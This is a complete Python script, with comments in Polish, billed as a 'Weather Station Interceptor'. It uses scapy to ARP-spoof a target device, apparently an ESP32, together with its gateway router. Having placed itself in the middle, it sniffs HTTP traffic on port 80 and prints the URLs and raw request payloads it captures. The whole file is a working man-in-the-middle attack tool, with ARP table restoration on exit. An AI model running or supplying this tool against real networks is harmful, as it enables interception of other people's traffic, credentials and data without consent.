#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import argparse
import sys
import time
import threading

def enable_ip_forwarding():
    print("[*] Enabling IP Forwarding...")
    # Tylko dla Linuxa
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
    except Exception as e:
        print(f"[-] Could not enable IP forwarding: {e}")

def get_mac(ip, interface):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # timeout zwiększony dla pewności
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, target_mac, spoof_ip, interface):
    # Tworzymy pakiet Ethernet + ARP
    # Mówimy ofierze (target_ip), że my (nasz MAC) mamy IP bramy (spoof_ip)
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False, iface=interface)

def restore(destination_ip, destination_mac, source_ip, source_mac, interface):
    # Przywracamy prawdziwe mapowanie
    packet = scapy.Ether(dst=destination_mac) / scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.sendp(packet, count=4, verbose=False, iface=interface)

def main():
    parser = argparse.ArgumentParser(description="Weather Station Interceptor (ARP Spoofing + HTTP Sniffing)")
    parser.add_argument("-t", "--target", dest="target_ip", help="Target ESP32 IP", required=True)
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway (Router) IP", required=True)
    parser.add_argument("-i", "--interface", dest="interface", help="Network Interface (e.g. wlan0, eth0)", default="wlan0")
    options = parser.parse_args()

    enable_ip_forwarding()

    print(f"[*] Resolving MAC addresses for {options.target_ip} and {options.gateway_ip}...")
    target_mac = get_mac(options.target_ip, options.interface)
    gateway_mac = get_mac(options.gateway_ip, options.interface)

    if not target_mac:
        print(f"[-] Could not find MAC for Target {options.target_ip}. Host is down or blocked?")
        sys.exit(1)
    if not gateway_mac:
        print(f"[-] Could not find MAC for Gateway {options.gateway_ip}.")
        sys.exit(1)

    print(f"[+] Target MAC: {target_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")

    def process_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            if packet.haslayer(scapy.IP) and packet[scapy.IP].src == options.target_ip:
                print(f"\n[+] HTTP Request from {packet[scapy.IP].src}")
                try:
                    host = packet[http.HTTPRequest].Host.decode() if packet[http.HTTPRequest].Host else ""
                    path = packet[http.HTTPRequest].Path.decode() if packet[http.HTTPRequest].Path else ""
                    url = host + path
                    print(f"    URL: {url}")
                except Exception:
                    pass
                
                if packet.haslayer(scapy.Raw):
                    try:
                        load = packet[scapy.Raw].load.decode(errors='ignore')
                        print(f"    Data: {load}")
                    except Exception:
                        pass

    def sniff_packets(interface):
        print(f"[*] Sniffing on interface {interface}...")
        scapy.sniff(iface=interface, store=False, prn=process_packet, filter="port 80")

    try:
        sent_packets_count = 0
        print(f"[*] Starting ARP Spoofing against {options.target_ip}...")
        
        stop_spoofing = False
        
        def spoof_loop():
            nonlocal sent_packets_count
            while not stop_spoofing:
                # Oszukujemy cel, że jesteśmy bramą
                spoof(options.target_ip, target_mac, options.gateway_ip, options.interface)
                # Oszukujemy bramę, że jesteśmy celem
                spoof(options.gateway_ip, gateway_mac, options.target_ip, options.interface)
                sent_packets_count += 2
                time.sleep(2)

        spoof_thread = threading.Thread(target=spoof_loop)
        spoof_thread.daemon = True
        spoof_thread.start()
        
        print("[*] Spoofing running in background. Starting Sniffer...")
        print("[*] Press Ctrl+C to stop.")
        sniff_packets(options.interface)
            
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected. Restoring ARP tables...")
        stop_spoofing = True
        restore(options.target_ip, target_mac, options.gateway_ip, gateway_mac, options.interface)
        restore(options.gateway_ip, gateway_mac, options.target_ip, target_mac, options.interface)
    except Exception as e:
        print(f"\n[-] Error: {e}")

if __name__ == "__main__":
    main()
